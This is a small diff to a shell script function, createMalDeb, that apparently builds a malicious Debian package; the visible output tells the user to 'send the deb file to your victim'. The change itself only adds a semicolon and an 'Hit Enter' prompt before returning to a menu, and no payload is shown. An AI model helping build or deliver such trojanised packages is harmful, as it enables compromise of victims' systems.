@@ -59,7 +59,7 @@ createMalDeb() {
 			
 			printf "${open}${light}${green}You can now send the deb file to your victim ${close}\n"
 			rm -rf "${fileName}$vnum$vnumber"
-			break
+			break;
 			;;
 	    n|N)
 		
@@ -74,5 +74,8 @@ createMalDeb() {
 	    *)
 		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
 	esac
-    done   
+    done
+    printf "%s\n"
+    read -ep "Hit Enter "
+    _select
 }
